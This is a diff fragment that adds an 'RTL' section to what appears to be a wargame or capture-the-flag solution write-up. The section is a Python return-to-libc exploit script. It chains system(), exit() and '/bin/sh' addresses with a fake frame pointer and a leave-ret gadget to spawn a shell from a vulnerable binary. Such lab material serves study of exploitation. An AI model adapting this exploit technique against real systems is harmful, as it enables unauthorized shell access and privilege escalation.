@@ -163,3 +163,41 @@ else:
 
 ------
 
+##### RTL
+
+```python
+import os
+import struct
+
+append = lambda x: payload + x
+p32 = lambda x: struct.pack("<I", x)
+
+target = "/home/assassin/zombie_assassin"
+
+buffer_addr = 0xbffffc40
+fake_ebp = buffer_addr - 4
+
+libc_addr = 0x40018000
+binsh_offset = 0xe3ff9
+binsh_addr = libc_addr + binsh_offset
+
+system_addr = 0x40058ae0
+leave_ret_gadjet = 0x80484df
+exit_addr = 0x400391e0
+
+payload = p32(system_addr)                      # buffer[40]
+payload = append(p32(exit_addr))
+payload = append(p32(binsh_addr))
+payload = append("\x90"*(40-12))
+payload = append(p32(fake_ebp))                 # sfp
+payload = append(p32(leave_ret_gadjet))         # ret
+
+pid = os.fork()
+if pid == 0:
+        os.execv(target, (target, payload))
+else:
+        os.waitpid(pid, 0)
+```
+
+-----
+
